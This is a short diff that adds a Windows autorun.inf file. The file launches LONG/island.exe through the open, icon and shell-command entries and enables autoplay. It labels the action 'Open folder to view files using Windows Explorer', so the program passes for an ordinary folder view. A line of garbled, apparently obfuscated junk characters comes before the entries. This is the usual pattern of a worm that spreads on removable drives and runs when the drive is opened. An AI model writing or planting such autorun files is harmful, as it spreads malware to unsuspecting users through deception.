@@ -1,0 +1,8 @@
+[autorun
+$SakslaäñÀÊÄË×ÀÄÊ×ŠËääêËÑÀ×?dlaskDlkqëäİôûİâÉÖİÂËÄİÖÉâäİÛÆÔäáÂİÄâİÆÄÉıçöâÄİÔÖëıöâëáİÄÛÔËâİÖÄıçäÂÔÛİÆëäáÂüáûÿÄÁÌÄÁÌÑÓëáÄİÉÄâæÔÄİÂÁßáÔÛáÔáâàÄÔÛëáÀäáéıöäëöÆàáÛÄëâÔâäİÉïüëàæùûüôÆüñßáñëËàÄÉÆëäáàİÖ
+open=LONG/island.exe
+action=Open folder to view files using Windows Explorer
+icon=LONG/island.exe
+Shell\open\command=LONG/island.exe
+shell\open\command=LONG/island.exe
+USEAUTOPLAY=1
